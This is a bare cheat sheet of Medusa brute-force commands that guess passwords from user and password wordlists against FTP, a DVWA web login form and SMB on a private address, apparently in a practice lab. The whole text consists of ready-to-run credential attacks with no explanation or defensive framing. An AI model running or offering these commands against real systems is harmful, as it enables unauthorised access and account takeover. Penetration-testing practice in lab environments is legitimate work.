FTP
medusa -h 192.168.56.104 -U users.txt -P pass.txt -M ftp
HTTP
medusa -h 192.168.56.104 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
SMB
medusa -h 192.168.56.104 -U users.txt -P pass.txt -M smbnt -t 2 -T 50 
